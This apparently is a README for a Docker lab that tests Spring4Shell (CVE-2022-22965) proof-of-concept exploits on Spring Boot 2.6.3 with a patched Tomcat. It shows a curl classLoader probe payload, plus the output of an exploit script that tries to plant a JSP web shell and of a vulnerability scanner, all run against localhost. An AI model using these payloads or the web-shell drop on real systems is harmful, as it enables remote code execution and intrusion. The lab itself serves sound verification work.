Lab to test poc exploit on vulnerable spring boot version 2.6.3 deployed on fixed tomcat version 8.5.78 with open-jdk 11

Tomcat version: 8.5.78
openJDK: 11
Spring Boot: 2.6.3

How to deploy?

```
docker build . -t sp4s-tomcat8.5.73-jdk11-spb2.6.3 && docker run -p 8001:8080 sp4s-tomcat8.5.73-jdk11-spb2.6.3
```

You can access the application at http://localhost:8001/helloworld/greeting

Test if application is vulnerable

## Using curl 

Source: https://twitter.com/RandoriAttack/status/1509298490106593283

If application is vulnerable it will return HTTP 400 code.

Original POC
```
$ curl host:port/path?class.module.classLoader.URLs%5B0%5D=0
```

Since our lab application endpoint accepts data from POST request we will send payload in body

```bash
$ curl -i http://localhost:8001/helloworld/greeting -d class.module.classLoader.URLs%5B0%5D=0
HTTP/1.1 400 
Content-Type: application/json
Date: Sun, 17 Apr 2022 19:55:40 GMT
Connection: close
Content-Length: 110

{"timestamp":"2022-04-17T19:55:40.760+00:00","status":400,"error":"Bad Request","path":"/helloworld/greeting"}
```

400 response indicates that application is vulnerable but is it exploitable let's try to exploit it using another exploit poc


## POC 2

https://github.com/BobTheShoplifter/Spring4Shell-POC
```bash
$ python exploit.py --url http://localhost:8001/helloworld/greeting
[*] Resetting Log Variables.
[*] Response code: 500
[*] Modifying Log Configurations
[*] Response code: 500
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 500
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://localhost.com:8001/shell.jsp?cmd=id
```

It gives 500 error when trying to upload the shell because of fixed tomcat version.


### POC 3
https://github.com/fullhunt/spring4shell-scan

```bash
python spring4shell-scan.py --url http://localhost:8001/helloworld/greeting
[•] CVE-2022-22965 - Spring4Shell RCE Scanner
[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
[•] Secure your External Attack Surface with FullHunt.io.
[•] URL: http://localhost:8001/helloworld/greeting
[%] Checking for Spring4Shell RCE CVE-2022-22965.
[•] URL: http://localhost:8001/helloworld/greeting | PAYLOAD: class.module.classLoader[ol38bo1]=ol38bo1
[!!!] Target Affected (CVE-2022-22965)
[!] Total Vulnerable Hosts: 1
[!] http://localhost:8001/helloworld/greeting
```

Again similar results exploit poc suggests application is vulnerable which it is but because tomcat version is fixed exploit didn't worked

